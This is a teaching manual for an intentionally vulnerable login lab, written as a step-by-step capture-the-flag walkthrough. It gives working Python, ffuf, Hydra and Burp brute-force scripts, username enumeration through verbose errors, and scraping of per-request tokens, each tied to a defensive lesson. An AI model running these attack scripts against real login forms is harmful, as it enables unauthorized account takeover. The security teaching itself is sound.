# Brute Force Lab — Level-by-Level Manual

A complete walkthrough of all four difficulty levels. Each section says what
defense is active, exactly how to beat it (with copy-paste commands), and the
real-world lesson.

- **Live lab:** `https://brute-force-lab-m6q2.onrender.com`
- **Class gate:** when the browser popup appears, enter username `student` and
  the class password your instructor gave you. (This just lets you into the
  lab; it is *not* the target you are attacking.)
- **The target:** the lab's own **login form**. Your job is to find a valid
  `username` + `password` and capture the `FLAG{...}` it shows on success.

> ⚠️ Only attack this lab. Brute-forcing any system you are not authorized to
> test is illegal.

Throughout, `BASE` means the lab URL above. Set the difficulty from the lab's
home page (or by visiting `BASE/set-level/<level>`).

---

## How the login works (read this first)

- It's a normal HTML form that sends a **POST** to `/login` with fields
  `username` and `password`.
- **Verbose errors leak information:**
  - Unknown user → `Username and/or password incorrect.`
  - **Known** user, wrong password → `Password incorrect for that user.`
  - That difference lets you **enumerate valid usernames first**, then only
    crack passwords for users that actually exist.
- On success the page contains `FLAG{...}`. Every attack below detects success
  by checking whether the response contains `FLAG` (or simply does **not**
  contain the word `incorrect`).
- There are several weak accounts. `admin` is one. The included list
  `wordlists/passwords.txt` cracks them.

### Two ways to send the class-gate password to command-line tools

Tools like `curl`, Hydra and ffuf get past the gate with HTTP basic auth:

- `curl -u student:CLASSPASS ...`
- Hydra: add `-m "basic auth:student:CLASSPASS"` style headers, or run tools
  from a browser session instead. (Easiest for students: use **Burp Suite**,
  which inherits the browser's gate login automatically.)

Replace `CLASSPASS` with the class password.

---

## Level 1 — LOW  (no protection)

**Defense:** none. Unlimited guesses, instant responses, verbose errors.

**Goal:** crack `admin` with a dictionary.

### Step 1 — enumerate usernames (optional but realistic)
Try a name and read the error. `admin` → "Password incorrect for that user"
means the account exists. `bob` → "Username and/or password incorrect" means it
doesn't.

### Step 2 — dictionary attack

**Python (simplest to understand):**
```python
import requests

BASE = "https://brute-force-lab-m6q2.onrender.com"
GATE = ("student", "CLASSPASS")      # the class gate
user = "admin"

s = requests.Session()
s.auth = GATE
s.get(f"{BASE}/set-level/low")

for pw in open("wordlists/passwords.txt"):
    pw = pw.strip()
    r = s.post(f"{BASE}/login", data={"username": user, "password": pw})
    if "FLAG{" in r.text:
        print(f"[+] FOUND  {user}:{pw}")
        print("   ", r.text.split("FLAG")[1].split("<")[0])
        break
    print(f"[-] {pw}")
```

**ffuf:**
```bash
ffuf -w wordlists/passwords.txt \
  -X POST -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u https://brute-force-lab-m6q2.onrender.com/login \
  -fr "incorrect"
```
`-fr "incorrect"` hides failed guesses, so only the hit shows.

**Hydra** (run against the host; `admin` password lands fast):
```bash
hydra -l admin -P wordlists/passwords.txt \
  brute-force-lab-m6q2.onrender.com https-post-form \
  "/login:username=^USER^&password=^PASS^:incorrect"
```

**Lesson:** with no controls, an online dictionary attack cracks a weak
password in seconds. Weak passwords are the root cause.

---

## Level 2 — MEDIUM  (rate throttling)

**Defense:** the server sleeps ~1.5s on **every** login attempt.

**Goal:** same crack, and *feel* the slowdown.

Use the **exact same attack** as LOW — just switch the level first
(`BASE/set-level/medium`). It still works; it just takes longer. Time it:

```python
import requests, time
BASE = "https://brute-force-lab-m6q2.onrender.com"
s = requests.Session(); s.auth = ("student", "CLASSPASS")
s.get(f"{BASE}/set-level/medium")

start = time.time()
for pw in open("wordlists/passwords.txt"):
    pw = pw.strip()
    r = s.post(f"{BASE}/login", data={"username": "admin", "password": pw})
    if "FLAG{" in r.text:
        print(f"[+] {pw} after {time.time()-start:.1f}s"); break
```

**Exercise:** compare the time per attempt vs LOW. Estimate how long a
10,000-word list would take at ~1.5s each (~4 hours). Then discuss: does
throttling *stop* the attack, or just slow it?

**Lesson:** rate limiting / throttling raises the cost of an attack and buys
defenders time, but a patient attacker still gets in. It is a speed bump, not
a wall.

---

## Level 3 — HIGH  (per-request anti-automation token)

**Defense:** every login attempt must include a hidden `user_token` that is
**unique per request**. A naive attack that just POSTs username+password is
rejected with "Invalid or missing request token."

**Goal:** defeat it by scraping the fresh token from each page before posting.

### Why naive tools fail
If you blast POSTs like in LOW, every one is rejected — you never even test a
password. You must do a **GET → parse token → POST** loop.

**Python (the right way):**
```python
import requests, re
BASE = "https://brute-force-lab-m6q2.onrender.com"
s = requests.Session(); s.auth = ("student", "CLASSPASS")
s.get(f"{BASE}/set-level/high")

TOKEN = re.compile(r'name="user_token" value="([a-f0-9]+)"')

for pw in open("wordlists/passwords.txt"):
    pw = pw.strip()
    page = s.get(f"{BASE}/login").text          # 1. GET fresh token
    tok = TOKEN.search(page).group(1)
    r = s.post(f"{BASE}/login", data={           # 2. POST with it
        "username": "admin", "password": pw, "user_token": tok})
    if "FLAG{" in r.text:
        print(f"[+] FOUND {pw}"); break
```

**Burp Suite Intruder** (the classroom-standard way):
1. Proxy a login request to **Intruder**.
2. Mark the `password` **and** `user_token` as payload positions.
3. For `user_token`, use the **Recursive grep** payload type: add a grep-match
   rule that extracts `user_token` value from the response, so Burp feeds the
   new token into the next request automatically.
4. Set the password payload to your wordlist and run.

**Lesson:** per-request tokens (like anti-CSRF tokens) break *simple*
automation and are a real speed bump, but they do **not** stop a determined
attacker who scripts the token-scraping. Tokens defend against CSRF and dumb
bots, not against a targeted brute force.

---

## Level 4 — IMPOSSIBLE  (account lockout)

**Defense:** after **5 failed attempts** on a username, that account is
**locked for 30 seconds**. While locked, even the *correct* password is
refused.

**Goal:** try the attack — and discover that it **fails**.

Run the LOW-style attack against a user whose password is *not* near the top of
the list (so you rack up failures), e.g. `1337`:

```python
import requests
BASE = "https://brute-force-lab-m6q2.onrender.com"
s = requests.Session(); s.auth = ("student", "CLASSPASS")
s.get(f"{BASE}/set-level/impossible")

for i, pw in enumerate(open("wordlists/passwords.txt"), 1):
    pw = pw.strip()
    r = s.post(f"{BASE}/login", data={"username": "1337", "password": pw})
    if "FLAG{" in r.text:
        print(f"[+] cracked on try {i}"); break
    if "locked" in r.text:
        print(f"[!] LOCKED OUT on try {i} — attack defeated"); break
    print(f"[-] {i} {pw}")
```

You'll hit the lock at attempt 5, well before reaching the real password.

**Exercises / discussion:**
- Wait 30s and try again — you get only a few more guesses before re-locking.
  At 5 guesses per 30s, a dictionary attack is hopeless online.
- **Downside of lockout:** an attacker can lock out *legitimate* users on
  purpose (a denial-of-service). How would you mitigate that? (e.g. lock by
  IP + account, use exponential backoff, or add CAPTCHA instead of hard lock.)
- Instructor can clear all locks with `BASE/reset-lockouts`.

**Lesson:** account lockout (and its cousins — exponential backoff, CAPTCHA,
MFA) is the control that actually defeats **online** brute force. The real
defense combo in production: strong/unique passwords + lockout/backoff + MFA,
plus never leaking which usernames exist.

---

## Wrap-up worksheet (hand to students)

For each level, record:

| Level | Did the attack succeed? | Time / attempts | Real-world control it represents |
|-------|------------------------|-----------------|----------------------------------|
| low | | | none |
| medium | | | rate limiting |
| high | | | anti-CSRF / anti-automation token |
| impossible | | | account lockout |

Final question: *If you could add only one control to a real login form first,
which would you pick and why?*
